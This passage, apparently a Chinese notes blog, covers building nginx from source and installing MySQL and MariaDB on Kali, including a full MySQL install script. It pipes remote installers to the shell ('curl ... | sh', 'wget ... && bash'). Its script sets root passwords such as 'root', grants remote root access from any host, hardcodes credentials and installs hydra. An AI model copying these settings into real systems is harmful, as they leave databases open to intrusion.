title=\"3.2解决方法\"></a>3.2解决方法</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 下载最新版的pcre包</span><br><span class=\"line\">https://sourceforge.net/projects/pcre/files/latest/download</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-指定pcre源码包路径继续安装\"><a href=\"#4-指定pcre源码包路径继续安装\" class=\"headerlink\" title=\"4.指定pcre源码包路径继续安装\"></a>4.指定pcre源码包路径继续安装</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 安装pcre2</span><br><span class=\"line\">cd /home/root/moudle/pcre2-10.33</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make install</span><br><span class=\"line\"># /home/root/moudle/nginx-1.16.1</span><br><span class=\"line\">./configure --prefix=/home/root/nginx --with-pcre=/home/root/pcre2-10.33</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-缺少zlib包\"><a href=\"#5-缺少zlib包\" class=\"headerlink\" title=\"5.缺少zlib包\"></a>5.缺少zlib包</h3><h3 id=\"5-1报错详情\"><a href=\"#5-1报错详情\" class=\"headerlink\" title=\"5.1报错详情\"></a>5.1报错详情</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">./configure: error: the HTTP gzip module requires the zlib library. You can either disable the module by using</span><br><span class=\"line\">--without-http_gzip_module option, or install the zlib library into the system, or build the zlib library statically</span><br><span class=\"line\">from the source with nginx by using --with-zlib= option. </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-2解决方法\"><a href=\"#5-2解决方法\" class=\"headerlink\" title=\"5.2解决方法\"></a>5.2解决方法</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 下载最新的zlib包</span><br><span class=\"line\">http://www.zlib.net/zlib-1.2.11.tar.gz</span><br><span class=\"line\"># 同第1步的解压一样，进入解压后的文件夹</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-安装完依赖包后重新生成Makefile文件\"><a href=\"#6-安装完依赖包后重新生成Makefile文件\" class=\"headerlink\" title=\"6.安装完依赖包后重新生成Makefile文件\"></a>6.安装完依赖包后重新生成Makefile文件</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/home/root/nginx --with-pcre=/home/root/pcre2-10.33</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-使用make编译并安装nginx服务器\"><a href=\"#7-使用make编译并安装nginx服务器\" class=\"headerlink\" title=\"7.使用make编译并安装nginx服务器\"></a>7.使用make编译并安装nginx服务器</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># /home/root/moudle/nginx-1.16.1</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8-编译软件继续报错……\"><a href=\"#8-编译软件继续报错……\" class=\"headerlink\" title=\"8.编译软件继续报错……\"></a>8.编译软件继续报错……</h3><h3 id=\"8-1报错详情\"><a href=\"#8-1报错详情\" class=\"headerlink\" title=\"8.1报错详情\"></a>8.1报错详情</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/root/module/pcre2-10.33 \\ &amp;&amp; make libpcre.la make[2]: 进入目录“/home/root/module/pcre2-10.33” make[2]:  </span><br><span class=\"line\">没有规则可制作目标“libpcre.la”。 停止。 make[2]: 离开目录“/home/root/module/pcre2-10.33” make[1]:  [objs/Makefile:1209：/</span><br><span class=\"line\">home/root/module/pcre2-10.33/.libs/libpcre.a] 错误 2 make[1]: 离开目录“/home/root/module/nginx-1.16.1” make: *** [</span><br><span class=\"line\">Makefile:8：build] 错误 2 </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8-2解决方法\"><a href=\"#8-2解决方法\" class=\"headerlink\" title=\"8.2解决方法\"></a>8.2解决方法</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 原来是nginx不支持pcre2报错找不到文件，重新下载pcre-8.43</span><br><span class=\"line\">https://ftp.pcre.org/pub/pcre/pcre-8.43.tar.gz</span><br><span class=\"line\"># 重复第4步 安装pcre</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"9-进入nginx的安装目录开始使用服务器\"><a href=\"#9-进入nginx的安装目录开始使用服务器\" class=\"headerlink\" title=\"9.进入nginx的安装目录开始使用服务器\"></a>9.进入nginx的安装目录开始使用服务器</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/root/nginx</span><br><span class=\"line\">cd sbin</span><br><span class=\"line\"># 查看nginx服务器版本</span><br><span class=\"line\">./nginx -v</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"9-1-版本信息\"><a href=\"#9-1-版本信息\" class=\"headerlink\" title=\"9.1 版本信息\"></a>9.1 版本信息</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜  sbin ./nginx -v</span><br></pre></td></tr></table></figure>\n\n<p>nginx version: nginx/1.16.1</p>\n<h3 id=\"9-2-显示更多详细信息\"><a href=\"#9-2-显示更多详细信息\" class=\"headerlink\" title=\"9.2 显示更多详细信息\"></a>9.2 显示更多详细信息</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜  sbin ./nginx -V nginx version: nginx/1.16.1 built by gcc 9.2.1 </span><br><span class=\"line\">20190821 (Debian 9.2.1-4)  configure arguments: </span><br><span class=\"line\">--prefix=/home/root/nginx --with-pcre=/home/root/module/pcre-8.43 </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"kali-mysql安装教程-Kali中安装mysql自动安装脚本\"><a href=\"#kali-mysql安装教程-Kali中安装mysql自动安装脚本\" class=\"headerlink\" title=\"kali mysql安装教程_Kali中安装mysql自动安装脚本\"></a>kali mysql安装教程_Kali中安装mysql自动安装脚本</h1><p>查看创建的mysql用户：</p>\n<p>cat /etc/passwd | grep mysql</p>\n<p>安装步骤：</p>\n<p>1.先删除mariadb</p>\n<p>apt-get autoremove –purge mariadb-client-core-10.3</p>\n<p>apt-get autoremove –purge</p>\n<p>2.把mysql的压缩包文件放入到/usr/local</p>\n<p>3.执行解压命令</p>\n<p>tar -zxvf mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz</p>\n<p>4.修改文件名</p>\n<p>mv mysql-5.7.20-linux-glibc2.12-x86_64 mysql</p>\n<p>5.创建用户：</p>\n<p>userdel mysql</p>\n<p>groupadd mysql</p>\n<p>useradd -r -g mysql mysql</p>\n<p>chown -R mysql:mysql mysql</p>\n<p>6.切换到mysql用户：</p>\n<p>su mysql</p>\n<p>7.进入到安装目录：</p>\n<p>cd mysql</p>\n<p>./bin/mysqld –initialize –user=mysql –basedir=/usr/local/mysql –datadir=/usr/local/mysql/data</p>\n<p>9.exit退出mysql用户</p>\n<p>10.拷贝文件：</p>\n<p>cp support-files/mysql.server /etc/init.d/mysql</p>\n<p>cp support-files/my-default.cnf /etc/my.cnf (5.7没有这个文件，自己找一个)</p>\n<p>cp bin/mysql /usr/bin/</p>\n<p>11.创建log文件输出路径：</p>\n<p>mkdir log</p>\n<p>touch log/mysqld.log</p>\n<p>chown -R mysql:mysql log/</p>\n<p>chmod -R 755 log/mysqld.log</p>\n<p>12.修改配置文件vim /etc/init.d/mysql</p>\n<p>basedir=/usr/local/mysql</p>\n<p>datadir=/usr/local/mysql/data (这个拷贝文件中如果添加，就不需要改了)</p>\n<p>修改下配置文件：vim /etc/my.cnf</p>\n<p>[client]</p>\n<p>default-character-set=utf8</p>\n<p>[mysqld]</p>\n<p>character-set-server=utf8</p>\n<p>datadir=/usr/local/mysql/data</p>\n<p>basedir=/usr/local/mysql</p>\n<p>socket=/tmp/mysql.sock</p>\n<p>max_heap_table_size = 512M</p>\n<p>[mysqld_safe]</p>\n<p>log-error=/usr/local/mysql/log/mysqld.log</p>\n<p>另外将被注释掉的innodb_buffer_pool_size = 128M放开(缺省值是8M，在批量插入数据过多时会产生错误，memsql设置128即可，MySQL需要设置为9G)</p>\n<p>启动数据库：</p>\n<p>service mysql start</p>\n<p>运行命令：vi /etc/my.cnf，编辑文件</p>\n<p>在文件的[mysqld]标签下添加一句：skip-grant-tables</p>\n<p>service mysql stop</p>\n<p>service mysql start</p>\n<p>进入数据库：mysql -u root</p>\n<p>使用数据库：use mysql;</p>\n<p>运行：</p>\n<p>update mysql.user set authentication_string=password(‘root’) where user=’root’;</p>\n<p>root_password替换成你想要的密码</p>\n<p>exit退出</p>\n<p>把my.conf的skip-grant-tables删除，重启数据库，</p>\n<p>修改自己的账号：</p>\n<p>ALTER USER ‘root‘@’localhost’ IDENTIFIED BY ‘root’;</p>\n<p>刷新权限</p>\n<p>flush privileges;</p>\n<p>退出：</p>\n<p>quit;</p>\n<p>设置访问权限：</p>\n<p>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘root’ WITH GRANT OPTION;</p>\n<p>刷新访问权限表</p>\n<p>flush privileges;</p>\n<p>刷新服务：</p>\n<p>service mysql restart</p>\n<p>重启服务：</p>\n<p>service mysql restart;</p>\n<p>添加用户：</p>\n<p>CREATE USER ‘用户名‘@’localhost’ IDENTIFIED BY ‘密码’;</p>\n<p>自动安装脚本：网上的好多都不能用。</p>\n<p>#!/bin/bash</p>\n<p>#coding: utf-8</p>\n<p>#filename: mysql_install.sh</p>\n<p>#version: 1.0</p>\n<p>#desc: mysql-5.7.28-linux-glibc2.12-x86_64.tar.gz 安装脚本</p>\n<p>#attention: 需要 root 用户执行</p>\n<p>echo ‘1、判断当前用户是否为root用户’</p>\n<p>if [ $(id -u) != “0” ];then</p>\n<p>echo “error: you must be root run this script”</p>\n<p>exit 1</p>\n<p>fi</p>\n<p>echo ‘2、定义变量’</p>\n<p>WKDIR=$(pwd)</p>\n<p>INSTALL_HOME=”/opt/module”</p>\n<p>MYSQL_HOME=”$INSTALL_HOME/mysql5.7”</p>\n<p>MYSQL_DATA=”$MYSQL_HOME/data”</p>\n<p>MYSQLD_HOME=”/var/run/mysqld/mysqld.sock”</p>\n<p>[ -d $INSTALL_HOME ] || mkdir -p $INSTALL_HOME</p>\n<p>echo ‘ 3、检验安装目录’</p>\n<p>if [ -d $MYSQL_HOME ];then</p>\n<p>echo “erro: your system have installed mysql”</p>\n<p>exit 1</p>\n<p>fi</p>\n<p>echo ‘ 4、卸载系统自带数据库’</p>\n<p>apt-get remove mariadb* -y</p>\n<p>apt-get remove mysql-common -y</p>\n<p>echo ‘5、开始安装’</p>\n<p>echo “start installing mysql”</p>\n<p>echo ‘ 解压’</p>\n<p>echo “start tar…”</p>\n<p>tar -xf mysql-5.7.28-linux-glibc2.12-x86_64.tar.gz</p>\n<p>mv mysql-5.7.28-linux-glibc2.12-x86_64 $MYSQL_HOME</p>\n<p>echo “tar complete”</p>\n<p>[ -d $MYSQL_DATA ] || mkdir -p $MYSQL_DATA</p>\n<p>echo ‘ 创建用户’</p>\n<p>id mysql &gt; /dev/null 2&gt;&amp;1</p>\n<p>if [ $? -ne 0 ];then</p>\n<p>useradd -s /sbin/nologin -M mysql</p>\n<p>fi</p>\n<p>echo ‘ 创建配置文件及日志目录’</p>\n<p>mkdir -p $MYSQL_HOME/etc</p>\n<p>mkdir -p $MYSQL_HOME/logs</p>\n<p>mkdir -p $MYSQL_HOME/tmp</p>\n<p>mkdir -p /var/run/mysqld</p>\n<p>chown -R mysql:mysql /var/run/mysqld/</p>\n<p>echo ‘ 更改 mysql 目录所属用户和组’</p>\n<p>chown -R mysql:mysql $MYSQL_HOME</p>\n<p>echo “initializing mysql”</p>\n<p>echo ‘ 初始化 mysql 数据库’</p>\n<p>$MYSQL_HOME/bin/mysqld –initialize –basedir=$MYSQL_HOME –datadir=$MYSQL_DATA –user=mysql</p>\n<p>echo ‘ 创建配置文件’</p>\n<p>cat &gt;$MYSQL_HOME/etc/my.cnf&lt;</p>\n<p>[mysqld]</p>\n<p>daemonize = on</p>\n<p>user = mysql</p>\n<p>port = 3306</p>\n<p>skip-grant-tables</p>\n<p>basedir = /opt/module/mysql5.7</p>\n<p>datadir = /opt/module/mysql5.7/data</p>\n<p>socket = /var/run/mysqld/mysqld.sock</p>\n<p>pid-file = /opt/module/mysql5.7/tmp/mysqld.pid</p>\n<p>log-error = /opt/module/mysql5.7/logs/mysqld.log</p>\n<p>character-set-server=utf8</p>\n<p>collation-server=utf8_general_ci</p>\n<p>innodb_buffer_pool_size = 10G</p>\n<p>innodb_log_file_size = 512M</p>\n<p>max_heap_table_size=5120M</p>\n<p>max_allowed_packet=100M</p>\n<p>max_connections=1000</p>\n<p>event_scheduler=ON</p>\n<p>lower_case_table_names=1</p>\n<p>sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</p>\n<p>[client]</p>\n<p>socket = /var/run/mysqld/mysqld.sock</p>\n<p>default-character-set=utf8</p>\n<p>EOF</p>\n<p>echo ‘ 注册服务’</p>\n<p>cat &gt;/lib/systemd/system/mysqld.service&lt;</p>\n<p>[Unit]</p>\n<p>Description=MySQL Server</p>\n<p>Documentation=man:mysqld(8)</p>\n<p>After=network.target</p>\n<p>After=syslog.target</p>\n<p>[Install]</p>\n<p>WantedBy=multi-user.target</p>\n<p>[Service]</p>\n<p>User=mysql</p>\n<p>Group=mysql</p>\n<p>Type=forking</p>\n<p>TimeoutSec=0</p>\n<p>PermissionsStartOnly=true</p>\n<p>ExecStart=/opt/module/mysql5.7/bin/mysqld –defaults-file=/opt/module/mysql5.7/etc/my.cnf</p>\n<p>LimitNOFILE = 5000</p>\n<p>Restart=on-failure</p>\n<p>PrivateTmp=false</p>\n<p>EOF</p>\n<p>echo ‘ 配置环境变量’</p>\n<p>cat &gt; /etc/profile.d/mysql.sh&lt;</p>\n<p>export PATH=$PATH:/opt/module/mysql5.7/bin</p>\n<p>EOF</p>\n<p>echo ‘ 使配置的环境变量生效’</p>\n<p>source /etc/profile.d/mysql.sh</p>\n<p>cp $MYSQL_HOME/bin/mysql /usr/bin/</p>\n<p>echo ‘ 启动服务’</p>\n<p>systemctl start mysqld</p>\n<p>systemctl enable mysqld</p>\n<p>#按照hydra</p>\n<p>cd $WKDIR</p>\n<p>dpkg -i libmariadb3_1%3a10.3.22-1_amd64.deb mysql-common_5.8+1.0.5_all.deb libmariadb3_1%3a10.3.22-1_amd64.deb mariadb-common_1%3a10.3.22-1_all.deb hydra_9.0-1_amd64.deb</p>\n<p>#设置开机启动</p>\n<p>systemctl enable /lib/systemd/system/mysqld.service</p>\n<p>echo “=======进入数据库=======”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -e “update mysql.user set authentication_string=password(‘root’) where user=’root’;”</p>\n<p>echo “======删除my.conf中的skip-grant-tablese删除=====”</p>\n<p>sed -i ‘5d’ /opt/module/mysql5.7/etc/my.cnf;</p>\n<p>service mysqld restart</p>\n<p>echo “=====设置root的访问权限=====”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -proot –connect-expired-password -e “alter user ‘root‘@’localhost’ identified by ‘’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘root’ WITH GRANT OPTION;”</p>\n<p>echo “=====添加新的用户======”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “CREATE USER ‘oms‘@’localhost’ IDENTIFIED BY ‘1234’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “GRANT GRANT OPTION ON <em>.</em> TO ‘oms‘@’localhost’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER ON <em>.</em> TO ‘oms‘@’localhost’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “ALTER USER ‘oms‘@’localhost’ IDENTIFIED WITH mysql_native_password BY ‘1234’;”</p>\n<p>service mysqld restart</p>\n<p>echo “开始创建 数据库”;</p>\n<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_common default charset ‘utf8’ collate ‘utf8_bin’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_state default charset ‘utf8’ collate ‘utf8_bin’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_history default charset ‘utf8’ collate ‘utf8_bin’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_asset default charset ‘utf8’ collate ‘utf8_bin’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database syslog default charset ‘utf8’ collate ‘utf8_bin’;”</p>\n<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 &lt;</p>\n<p>use dris_common;</p>\n<p>source sql/dris_common.sql;</p>\n<p>use dris_state;</p>\n<p>source sql/dris_state.sql;</p>\n<p>use dris_history;</p>\n<p>source sql/dris_history.sql;</p>\n<p>use dris_asset;</p>\n<p>source sql/dris_asset.sql;</p>\n<p>EOF</p>\n<p>echo “开始创建 数据库完成”;</p>\n<h1 id=\"Kali–MariaDB安装-使用-改密-卸载一条龙\"><a href=\"#Kali–MariaDB安装-使用-改密-卸载一条龙\" class=\"headerlink\" title=\"Kali–MariaDB安装,使用,改密,卸载一条龙\"></a><a href=\"https://www.cnblogs.com/qinghemo/p/14342678.html\">Kali–MariaDB安装,使用,改密,卸载一条龙</a></h1><h2 id=\"Kali-MariaDB安装使用\"><a href=\"#Kali-MariaDB安装使用\" class=\"headerlink\" title=\"Kali-MariaDB安装使用\"></a>Kali-MariaDB安装使用</h2><blockquote>\n<p>据说mysql现在对kali收费,所以得用其他数据库代替,这里倒腾了下mariadb</p>\n</blockquote>\n<hr>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ol>\n<li>安装mariadb-client</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mariadb-client</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>安装mariadb-server</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mariadb-server</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>设置为开机启动服务</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl enable mysql</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">停止开机启动可以用如下命令</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">systemctl <span class=\"built_in\">disable</span> mysql</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><h3 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h3><p>第一次使用时,需要初始化,此时设置登录数据库的密码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql_secure_installation </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"忘记密码\"><a href=\"#忘记密码\" class=\"headerlink\" title=\"忘记密码\"></a>忘记密码</h3><ol>\n<li>知道数据库root密码需要修改,直接在shell修改</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysqladmin -uroot -p[oldpassword] password newpassword</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>登录数据库修改</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">use mysql;</span><br><span class=\"line\"><span class=\"comment\">-- 查看数据库用户信息</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> host,<span class=\"keyword\">user</span>,plugin,authentication_string <span class=\"keyword\">from</span> mysql.user;</span><br><span class=\"line\"><span class=\"comment\">-- 修改密码</span></span><br><span class=\"line\"><span class=\"keyword\">UPDATE</span> <span class=\"keyword\">user</span> <span class=\"keyword\">SET</span> password<span class=\"operator\">=</span>password(<span class=\"string\">&#x27;newpassword&#x27;</span>) <span class=\"keyword\">WHERE</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">-- 新版MySQL采用此SQL</span></span><br><span class=\"line\"><span class=\"keyword\">UPDATE</span> <span class=\"keyword\">user</span> <span class=\"keyword\">SET</span> authentication_string<span class=\"operator\">=</span>PASSWORD(<span class=\"string\">&#x27;newpassword&#x27;</span>) <span class=\"keyword\">where</span> <span class=\"keyword\">USER</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">-- 修改密码</span></span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">USER</span> <span class=\"string\">&#x27;root&#x27;</span>@<span class=\"string\">&#x27;localhost&#x27;</span> IDENTIFIED <span class=\"keyword\">WITH</span> mysql_native_password <span class=\"keyword\">BY</span> <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\">flush privilieges;</span><br><span class=\"line\">exit;</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>使用set指令设置root密码<br>登录数据库</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SET</span> password <span class=\"keyword\">for</span> <span class=\"string\">&#x27;root&#x27;</span>@<span class=\"string\">&#x27;localhost&#x27;</span><span class=\"operator\">=</span>password(<span class=\"string\">&#x27;newpassword&#x27;</span>); </span><br><span class=\"line\">exit; </span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>忘记数据库root密码,则要跳过授权的方式启动mariadb以修改密码</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">停止服务</span></span><br><span class=\"line\">systemctl stop mariadb</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置跳过授权启动mariadb,然后登录数据库用2,3方法修改数据库密码</span></span><br><span class=\"line\">mysqld_safe --skip-grant-tables &amp;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改密码后,跳权启动设置失效,设置正常启动mariadb</span></span><br><span class=\"line\">systemctl start mariadb</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>修改登录mariadb的方式,从unix socket密码登录<br>Mariadb在5.2.0以后的版本默认不再使用密码认证了，改用Authentication Plugin - Unix Socket插件认证。而Unix Socke插件认证直接忽略密码. 通过以下方式可以切换回密码登录</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">use mysql;</span><br><span class=\"line\"><span class=\"keyword\">update</span> mysql.user <span class=\"keyword\">set</span> plugin<span class=\"operator\">=</span><span class=\"string\">&#x27;mysql_native_password&#x27;</span> <span class=\"keyword\">where</span> <span class=\"keyword\">User</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"卸载\"><a href=\"#卸载\" class=\"headerlink\" title=\"卸载\"></a>卸载</h2><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get remove mariadb-client</span><br><span class=\"line\">sudo apt-get autoremove mariadb-client</span><br><span class=\"line\"> </span><br><span class=\"line\">sudo apt-get remove mariadb-server</span><br><span class=\"line\">sudo apt-get autoremove mariadb-server</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>分类: <a href=\"https://www.cnblogs.com/qinghemo/category/1574729.html\">Database</a>, <a href=\"https://www.cnblogs.com/qinghemo/category/1924375.html\">Linux</a></p>\n<h1 id=\"Kali-2019-4-下卸载并重新安装MySQL\"><a href=\"#Kali-2019-4-下卸载并重新安装MySQL\" class=\"headerlink\" title=\"Kali 2019.4 下卸载并重新安装MySQL\"></a>Kali 2019.4 下卸载并重新安装MySQL</h1><p>一、完全卸载Mysql</p>\n<p>首先用 dpkg –list | grep mysql 查看自己的mysql有哪些依赖<br>卸载mysql相关应用   apt-get remove mysql*<br> 再用 dpkg –list|grep mysql 查看，还剩什么就卸载什么<br>最后清除残留数据：</p>\n<p>dpkg -l | grep ^rc | awk ‘{print $2}’ | sudo xargs dpkg -P</p>\n<p>保险起见再执行以下命令：</p>\n<p>apt-get remove mariadb-client</p>\n<p>apt-get autoremove mariadb-client</p>\n<p>apt-get remove mariadb-server</p>\n<p>apt-get autoremove mariadb-server</p>\n<p>如果提示没有安装所以不用删除说明删干净了</p>\n<p>二、安装Mariadb</p>\n<p>这里因为kali的版本没有mysql的包，所以来安装Mariadb</p>\n<p>apt-get install mariadb-client-10.3</p>\n<p>apt-get install mariadb-server-10.3</p>\n<p>如果不指定版本安装的就是最新的</p>\n<p>之后输入vim /etc/mysql/my.cnf，添加以下内容：</p>\n<p>[client-server]</p>\n<p>port=3306</p>\n<p>socket=/tmp/mysql.sock</p>\n<p>[mysql]</p>\n<p>#default-character-set=utf8</p>\n<p>[mysqld]</p>\n<p>basedir=/usr/local/mysql/</p>\n<p>datadir=/usr/local/mysql/data/mysql</p>\n<p>character-set-server=utf8</p>\n<p>tmpdir=/tmp</p>\n<p>:wq! 保存</p>\n<p>然后配置mysql开机自启动, sudo systemctl enable mysql</p>\n<pre><code>   启动mysql,   service mysql start\n</code></pre>\n<p>三、配置Mariadb数据库</p>\n<p>命令行下输入mysql ，进入Mariadb命令行界面<br>show databases;<br>use mysql<br>show tables;<br>desc user;<br>select User, Host, Password from user;<br>为root用户设置密码 update user set Password=password(‘123456’) where User=’root’;<br>flush privileges;<br>Ctrl + D退出Mariadb命令行，验证密码是否设置成功<br>mysql -u root -p</p>\n<p>Mariadb用户权限与管理【转】MariaDB/MySQL用户和权限管理<br>四、Mariadb密码无效</p>\n<p>在新版的Mariadb安装过程中没有设置密码的过程了，而在命令行你发现直接用mysql就可以登录数据库，完全不用密码，然而你用其他的mysql管理工具使用密码无论如何都会提示 Access denied for user ‘root’@‘localhost’ 。</p>\n<p>Mariadb在5.2.0以后的版本默认不再使用密码认证了，改用Authentication Plugin - Unix Socket插件认证。具体参考<a href=\"https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/\">https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/</a></p>\n<h2 id=\"解决方法：\"><a href=\"#解决方法：\" class=\"headerlink\" title=\"解决方法：\"></a>解决方法：</h2><p>​        虽然这是为了提高安全性，但有的地方我们必须使用密码认证登录，因此我们就要修改验证为密码的方式。直接在命令行输入 mysql 登录数据库。使用以下命令修改<br>​        use mysql;<br>​        update mysql.user set plugin=’mysql_native_password’ where User=’root’;<br>​        flush privileges;</p>\n<h1 id=\"宝塔面板安装相关\"><a href=\"#宝塔面板安装相关\" class=\"headerlink\" title=\"宝塔面板安装相关\"></a>宝塔面板安装相关</h1><h2 id=\"问题相关\"><a href=\"#问题相关\" class=\"headerlink\" title=\"问题相关\"></a>问题相关</h2><p>wget -O install.sh <a href=\"http://download.bt.cn/install/install-ubuntu_6.0.sh\">http://download.bt.cn/install/install-ubuntu_6.0.sh</a> &amp;&amp; bash install.sh</p>\n<p>出现ERROR：Failed building wheel for cryptography。。。尝试以下：</p>\n<p>python的pip安装库到指定目录<br>pip install cryptography==36.0.1 –target=/www/server/panel/pyenv/lib/python3.7/site-packages</p>\n<p>curl <a href=\"https://sh.rustup.rs/\">https://sh.rustup.rs</a> -sSf | sh<br>source $HOME/.cargo/env<br>rustc –version</p>\n<p>export CRYPTOGRAPHY_DONT_BUILD_RUST=1<br>pip3 install –upgrade homeassistant</p>\n<p><a href=\"https://cryptography.io/en/latest/installation/#rust\">https://cryptography.io/en/latest/installation/#rust</a></p>\n<h2 id=\"ERROR-Failed-building-wheel-for-cryptography\"><a href=\"#ERROR-Failed-building-wheel-for-cryptography\" class=\"headerlink\" title=\"ERROR: Failed building wheel for cryptography\"></a><a href=\"https://community.home-assistant.io/t/error-failed-building-wheel-for-cryptography/352020\">ERROR: Failed building wheel for cryptography</a></h2><p><a href=\"https://community.home-assistant.io/u/trentjw\">trentjw</a> (Trenton J Wilson)November 1, 2021, 2:30am#1</p>\n<p>trying to update to latest version and this is the error I get<br>ERROR: Failed building wheel for cryptography<br>Failed to build cryptography<br>ERROR: Could not build wheels for cryptography, which is required to install pyproject.toml-based projects</p>\n<p><a href=\"https://community.home-assistant.io/u/koying\">koying</a> (Chris B)November 1, 2021, 12:56pm#2</p>\n<p>That issue, I guess:</p>\n<p><img src=\"https://community.home-assistant.io/user_avatar/community.home-assistant.io/radu/40/152885_2.png\" alt=\"img\"> <a href=\"https://community.home-assistant.io/t/cannot-update-to-2021-10-0/344695\">Cannot update to 2021.10.0</a> <a href=\"https://community.home-assistant.io/c/installation/17\">Installation</a></p>\n<blockquote>\n<p>I’m running HASS from a python env and i updated each time a new update came out however today i cannot update 2021.10.0. i get this after running python3 -m pip install –upgrade homeassistant in the correct container: error: can’t find Rust compiler If you are using an outdated pip version, it is possible a prebuilt wheel is available for this package but pip is not able to install from it. Installing from the 